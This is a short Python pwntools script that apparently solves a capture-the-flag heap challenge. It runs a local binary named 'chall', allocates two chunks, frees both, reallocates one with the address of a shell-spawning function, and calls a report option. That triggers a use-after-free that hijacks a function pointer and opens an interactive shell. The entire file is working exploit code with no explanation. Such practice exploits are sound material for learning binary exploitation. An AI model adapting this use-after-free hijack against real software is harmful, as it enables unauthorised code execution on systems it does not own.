#!/usr/bin/python3
from pwn import process, p64

shell = process("./chall")

get_shell = p64(0x401276)

def add(size, data):
    shell.sendlineafter(b"> ", b"1")
    shell.sendlineafter(b"> ", b"1")
    shell.sendlineafter(b"> ", str(size).encode())
    shell.sendlineafter(b"> ", data)
    shell.recvline_contains(b"[DEBUG]")

def remove(index):
    shell.sendlineafter(b"> ", b"2")
    shell.sendlineafter(b"> ", str(index).encode())

def report(index):
    shell.sendlineafter(b"> ", b"3")
    shell.sendlineafter(b"> ", str(index).encode())

add(0x19, b"A" * 8)
add(0x19, b"B" * 8)

remove(0)
remove(1)

add(0x18, get_shell)

report(0)

shell.interactive()
